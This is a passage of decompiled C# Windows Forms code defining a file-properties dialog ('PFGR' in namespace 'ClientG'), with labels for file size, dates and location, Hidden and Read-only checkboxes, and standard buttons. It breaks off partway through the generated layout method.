using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ClientG.My;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class PFGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("OK")]
	private Button _OK;

	[AccessedThroughProperty("Apply")]
	private Button _Apply;

	[AccessedThroughProperty("Cancel")]
	private Button _Cancel;

	[AccessedThroughProperty("rtrgfgfgg")]
	private Label _rtrgfgfgg;

	[AccessedThroughProperty("ujikkkk")]
	private Label _ujikkkk;

	[AccessedThroughProperty("regrgrtttt")]
	private Label _regrgrtttt;

	[AccessedThroughProperty("regrgrg")]
	private Label _regrgrg;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("FN")]
	private TextBox _FN;

	[AccessedThroughProperty("trgyh")]
	private Label _trgyh;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("hhhht")]
	private Label _hhhht;

	[AccessedThroughProperty("rtrtrrrrr")]
	private Label _rtrtrrrrr;

	[AccessedThroughProperty("rtr")]
	private Label _rtr;

	[AccessedThroughProperty("yht")]
	private Label _yht;

	[AccessedThroughProperty("eregg")]
	private Label _eregg;

	[AccessedThroughProperty("rrtt")]
	private Label _rrtt;

	[AccessedThroughProperty("trr")]
	private Label _trr;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("HI")]
	private CheckBox _HI;

	[AccessedThroughProperty("RN")]
	private CheckBox _RN;

	[AccessedThroughProperty("FINFO")]
	private ListView _FINFO;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	public string FNS;

	public bool REN;

	public bool HIF;

	public string FP;

	public int Sock;

	public bool IT;

	internal virtual TabControl TabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual Button OK
	{
		[DebuggerNonUserCode]
		get
		{
			return _OK;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = OK_Click;
			if (_OK != null)
			{
				((Control)_OK).remove_Click(eventHandler);
			}
			_OK = value;
			if (_OK != null)
			{
				((Control)_OK).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Apply
	{
		[DebuggerNonUserCode]
		get
		{
			return _Apply;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Apply_Click;
			if (_Apply != null)
			{
				((Control)_Apply).remove_Click(eventHandler);
			}
			_Apply = value;
			if (_Apply != null)
			{
				((Control)_Apply).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Cancel
	{
		[DebuggerNonUserCode]
		get
		{
			return _Cancel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Cancel_Click;
			if (_Cancel != null)
			{
				((Control)_Cancel).remove_Click(eventHandler);
			}
			_Cancel = value;
			if (_Cancel != null)
			{
				((Control)_Cancel).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label rtrgfgfgg
	{
		[DebuggerNonUserCode]
		get
		{
			return _rtrgfgfgg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_rtrgfgfgg = value;
		}
	}

	internal virtual Label ujikkkk
	{
		[DebuggerNonUserCode]
		get
		{
			return _ujikkkk;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ujikkkk = value;
		}
	}

	internal virtual Label regrgrtttt
	{
		[DebuggerNonUserCode]
		get
		{
			return _regrgrtttt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_regrgrtttt = value;
		}
	}

	internal virtual Label regrgrg
	{
		[DebuggerNonUserCode]
		get
		{
			return _regrgrg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_regrgrg = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual TextBox FN
	{
		[DebuggerNonUserCode]
		get
		{
			return _FN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = FN_TextChanged;
			if (_FN != null)
			{
				((Control)_FN).remove_TextChanged(eventHandler);
			}
			_FN = value;
			if (_FN != null)
			{
				((Control)_FN).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label trgyh
	{
		[DebuggerNonUserCode]
		get
		{
			return _trgyh;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_trgyh = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label hhhht
	{
		[DebuggerNonUserCode]
		get
		{
			return _hhhht;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_hhhht = value;
		}
	}

	internal virtual Label rtrtrrrrr
	{
		[DebuggerNonUserCode]
		get
		{
			return _rtrtrrrrr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_rtrtrrrrr = value;
		}
	}

	internal virtual Label rtr
	{
		[DebuggerNonUserCode]
		get
		{
			return _rtr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_rtr = value;
		}
	}

	internal virtual Label yht
	{
		[DebuggerNonUserCode]
		get
		{
			return _yht;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_yht = value;
		}
	}

	internal virtual Label eregg
	{
		[DebuggerNonUserCode]
		get
		{
			return _eregg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_eregg = value;
		}
	}

	internal virtual Label rrtt
	{
		[DebuggerNonUserCode]
		get
		{
			return _rrtt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_rrtt = value;
		}
	}

	internal virtual Label trr
	{
		[DebuggerNonUserCode]
		get
		{
			return _trr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_trr = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual CheckBox HI
	{
		[DebuggerNonUserCode]
		get
		{
			return _HI;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = HI_CheckedChanged;
			if (_HI != null)
			{
				_HI.remove_CheckedChanged(eventHandler);
			}
			_HI = value;
			if (_HI != null)
			{
				_HI.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBox RN
	{
		[DebuggerNonUserCode]
		get
		{
			return _RN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RN_CheckedChanged;
			if (_RN != null)
			{
				_RN.remove_CheckedChanged(eventHandler);
			}
			_RN = value;
			if (_RN != null)
			{
				_RN.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual ListView FINFO
	{
		[DebuggerNonUserCode]
		get
		{
			return _FINFO;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_FINFO = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader1 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	[DebuggerNonUserCode]
	public PFGR()
	{
		((Form)this).add_Load((EventHandler)PF_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0467: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d1: Expected O, but got Unknown
		//IL_055e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0568: Expected O, but got Unknown
		//IL_05f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fe: Expected O, but got Unknown
		//IL_067c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0686: Expected O, but got Unknown
		//IL_0704: Unknown result type (might be due to invalid IL or missing references)
		//IL_070e: Expected O, but got Unknown
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0796: Expected O, but got Unknown
		//IL_0814: Unknown result type (might be due to invalid IL or missing references)
		//IL_081e: Expected O, but got Unknown
		//IL_0899: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a3: Expected O, but got Unknown
		//IL_0975: Unknown result type (might be due to invalid IL or missing references)
		//IL_097f: Expected O, but got Unknown
		//IL_09ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f6: Expected O, but got Unknown
		//IL_0a74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a7e: Expected O, but got Unknown
		//IL_0af9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b03: Expected O, but got Unknown
		//IL_0b81: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b8b: Expected O, but got Unknown
		//IL_0c09: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c13: Expected O, but got Unknown
		//IL_0c91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c9b: Expected O, but got Unknown
		//IL_0d16: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d20: Expected O, but got Unknown
		//IL_0d9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da8: Expected O, but got Unknown
		//IL_0e22: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e2c: Expected O, but got Unknown
		//IL_0ea6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eb0: Expected O, but got Unknown
		//IL_0f2f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f39: Expected O, but got Unknown
		//IL_0fb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc3: Expected O, but got Unknown
		//IL_1040: Unknown result type (might be due to invalid IL or missing references)
		//IL_104a: Expected O, but got Unknown
		//IL_1102: Unknown result type (might be due to invalid IL or missing references)
		//IL_1190: Unknown result type (might be due to invalid IL or missing references)
		//IL_119a: Expected O, but got Unknown
		//IL_125d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1267: Expected O, but got Unknown
		//IL_12e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_12f1: Expected O, but got Unknown
		//IL_1371: Unknown result type (might be due to invalid IL or missing references)
		//IL_137b: Expected O, but got Unknown
		//IL_1483: Unknown result type (might be due to invalid IL or missing references)
		//IL_148d: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PFGR));
		TabControl1 = new TabControl();
		TabPage1 = new TabPage();
		HI = new CheckBox();
		RN = new CheckBox();
		Label7 = new Label();
		Label6 = new Label();
		Label5 = new Label();
		Label4 = new Label();
		Label3 = new Label();
		Label2 = new Label();
		PictureBox1 = new PictureBox();
		FN = new TextBox();
		trgyh = new Label();
		Label1 = new Label();
		hhhht = new Label();
		rtrtrrrrr = new Label();
		rtr = new Label();
		yht = new Label();
		eregg = new Label();
		rrtt = new Label();
		trr = new Label();
		rtrgfgfgg = new Label();
		ujikkkk = new Label();
		regrgrtttt = new Label();
		regrgrg = new Label();
		TabPage2 = new TabPage();
		FINFO = new ListView();
		ColumnHeader1 = new ColumnHeader();
		ColumnHeader2 = new ColumnHeader();
		OK = new Button();
		Apply = new Button();
		Cancel = new Button();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)TabPage2).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage1);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage2);
		TabControl tabControl = TabControl1;
		Point location = new Point(2, 3);
		((Control)tabControl).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl1;
		Size size = new Size(350, 311);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl1).set_TabIndex(0);
		TabPage1.set_BackColor(Color.White);
		((Control)TabPage1).get_Controls().Add((Control)(object)HI);
		((Control)TabPage1).get_Controls().Add((Control)(object)RN);
		((Control)TabPage1).get_Controls().Add((Control)(object)Label7);
		((Control)TabPage1).get_Controls().Add((Control)(object)Label6);
		((Control)TabPage1).get_Controls().Add((Control)(object)Label5);
		((Control)TabPage1).get_Controls().Add((Control)(object)Label4);
		((Control)TabPage1).get_Controls().Add((Control)(object)Label3);
		((Control)TabPage1).get_Controls().Add((Control)(object)Label2);
		((Control)TabPage1).get_Controls().Add((Control)(object)PictureBox1);
		((Control)TabPage1).get_Controls().Add((Control)(object)FN);
		((Control)TabPage1).get_Controls().Add((Control)(object)trgyh);
		((Control)TabPage1).get_Controls().Add((Control)(object)Label1);
		((Control)TabPage1).get_Controls().Add((Control)(object)hhhht);
		((Control)TabPage1).get_Controls().Add((Control)(object)rtrtrrrrr);
		((Control)TabPage1).get_Controls().Add((Control)(object)rtr);
		((Control)TabPage1).get_Controls().Add((Control)(object)yht);
		((Control)TabPage1).get_Controls().Add((Control)(object)eregg);
		((Control)TabPage1).get_Controls().Add((Control)(object)rrtt);
		((Control)TabPage1).get_Controls().Add((Control)(object)trr);
		((Control)TabPage1).get_Controls().Add((Control)(object)rtrgfgfgg);
		((Control)TabPage1).get_Controls().Add((Control)(object)ujikkkk);
		((Control)TabPage1).get_Controls().Add((Control)(object)regrgrtttt);
		((Control)TabPage1).get_Controls().Add((Control)(object)regrgrg);
		TabPage tabPage = TabPage1;
		location = new Point(4, 22);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(342, 285);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("General");
		((ButtonBase)HI).set_AutoSize(true);
		((Control)HI).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox hI = HI;
		location = new Point(235, 247);
		((Control)hI).set_Location(location);
		((Control)HI).set_Name("HI");
		CheckBox hI2 = HI;
		size = new Size(65, 17);
		((Control)hI2).set_Size(size);
		((Control)HI).set_TabIndex(22);
		((ButtonBase)HI).set_Text("Hidden");
		((ButtonBase)HI).set_UseVisualStyleBackColor(true);
		((ButtonBase)RN).set_AutoSize(true);
		((Control)RN).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox rN = RN;
		location = new Point(145, 247);
		((Control)rN).set_Location(location);
		((Control)RN).set_Name("RN");
		CheckBox rN2 = RN;
		size = new Size(84, 17);
		((Control)rN2).set_Size(size);
		((Control)RN).set_TabIndex(4);
		((ButtonBase)RN).set_Text("Read-only");
		((ButtonBase)RN).set_UseVisualStyleBackColor(true);
		Label7.set_AutoSize(true);
		((Control)Label7).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label7;
		location = new Point(89, 210);
		((Control)label).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label2 = Label7;
		size = new Size(28, 13);
		((Control)label2).set_Size(size);
		((Control)Label7).set_TabIndex(21);
		Label7.set_Text("N/A");
		Label6.set_AutoSize(true);
		((Control)Label6).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label3 = Label6;
		location = new Point(89, 190);
		((Control)label3).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label4 = Label6;
		size = new Size(28, 13);
		((Control)label4).set_Size(size);
		((Control)Label6).set_TabIndex(20);
		Label6.set_Text("N/A");
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label5 = Label5;
		location = new Point(89, 169);
		((Control)label5).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label6 = Label5;
		size = new Size(28, 13);
		((Control)label6).set_Size(size);
		((Control)Label5).set_TabIndex(19);
		Label5.set_Text("N/A");
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label7 = Label4;
		location = new Point(89, 137);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(28, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(18);
		Label4.set_Text("N/A");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label9 = Label3;
		location = new Point(89, 115);
		((Control)label9).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label10 = Label3;
		size = new Size(28, 13);
		((Control)label10).set_Size(size);
		((Control)Label3).set_TabIndex(17);
		Label3.set_Text("N/A");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label11 = Label2;
		location = new Point(89, 85);
		((Control)label11).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label12 = Label2;
		size = new Size(28, 13);
		((Control)label12).set_Size(size);
		((Control)Label2).set_TabIndex(16);
		Label2.set_Text("N/A");
		PictureBox pictureBox = PictureBox1;
		location = new Point(14, 15);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(35, 32);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(4);
		PictureBox1.set_TabStop(false);
		((Control)FN).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox fN = FN;
		location = new Point(63, 26);
		((Control)fN).set_Location(location);
		((Control)FN).set_Name("FN");
		TextBox fN2 = FN;
		size = new Size(258, 21);
		((Control)fN2).set_Size(size);
		((Control)FN).set_TabIndex(4);
		trgyh.set_AutoSize(true);
		((Control)trgyh).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj = trgyh;
		location = new Point(9, 245);
		((Control)obj).set_Location(location);
		((Control)trgyh).set_Name("trgyh");
		Label obj2 = trgyh;
		size = new Size(71, 13);
		((Control)obj2).set_Size(size);
		((Control)trgyh).set_TabIndex(15);
		trgyh.set_Text("Attributes :");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label13 = Label1;
		location = new Point(89, 64);
		((Control)label13).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label14 = Label1;
		size = new Size(28, 13);
		((Control)label14).set_Size(size);
		((Control)Label1).set_TabIndex(14);
		Label1.set_Text("N/A");
		hhhht.set_AutoSize(true);
		((Control)hhhht).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj3 = hhhht;
		location = new Point(9, 190);
		((Control)obj3).set_Location(location);
		((Control)hhhht).set_Name("hhhht");
		Label obj4 = hhhht;
		size = new Size(63, 13);
		((Control)obj4).set_Size(size);
		((Control)hhhht).set_TabIndex(13);
		hhhht.set_Text("Modified :");
		rtrtrrrrr.set_AutoSize(true);
		((Control)rtrtrrrrr).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj5 = rtrtrrrrr;
		location = new Point(9, 169);
		((Control)obj5).set_Location(location);
		((Control)rtrtrrrrr).set_Name("rtrtrrrrr");
		Label obj6 = rtrtrrrrr;
		size = new Size(62, 13);
		((Control)obj6).set_Size(size);
		((Control)rtrtrrrrr).set_TabIndex(12);
		rtrtrrrrr.set_Text("Created :");
		rtr.set_AutoSize(true);
		((Control)rtr).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj7 = rtr;
		location = new Point(9, 137);
		((Control)obj7).set_Location(location);
		((Control)rtr).set_Name("rtr");
		Label obj8 = rtr;
		size = new Size(40, 13);
		((Control)obj8).set_Size(size);
		((Control)rtr).set_TabIndex(11);
		rtr.set_Text("Size :");
		yht.set_AutoSize(true);
		((Control)yht).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj9 = yht;
		location = new Point(9, 115);
		((Control)obj9).set_Location(location);
		((Control)yht).set_Name("yht");
		Label obj10 = yht;
		size = new Size(63, 13);
		((Control)obj10).set_Size(size);
		((Control)yht).set_TabIndex(10);
		yht.set_Text("Location :");
		eregg.set_AutoSize(true);
		((Control)eregg).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj11 = eregg;
		location = new Point(9, 210);
		((Control)obj11).set_Location(location);
		((Control)eregg).set_Name("eregg");
		Label obj12 = eregg;
		size = new Size(69, 13);
		((Control)obj12).set_Size(size);
		((Control)eregg).set_TabIndex(9);
		eregg.set_Text("Accessed :");
		rrtt.set_AutoSize(true);
		((Control)rrtt).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj13 = rrtt;
		location = new Point(9, 85);
		((Control)obj13).set_Location(location);
		((Control)rrtt).set_Name("rrtt");
		Label obj14 = rrtt;
		size = new Size(80, 13);
		((Control)obj14).set_Size(size);
		((Control)rrtt).set_TabIndex(8);
		rrtt.set_Text("Description :");
		trr.set_AutoSize(true);
		((Control)trr).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label obj15 = trr;
		location = new Point(9, 64);
		((Control)obj15).set_Location(location);
		((Control)trr).set_Name("trr");
		Label obj16 = trr;
		size = new Size(79, 13);
		((Control)obj16).set_Size(size);
		((Control)trr).set_TabIndex(4);
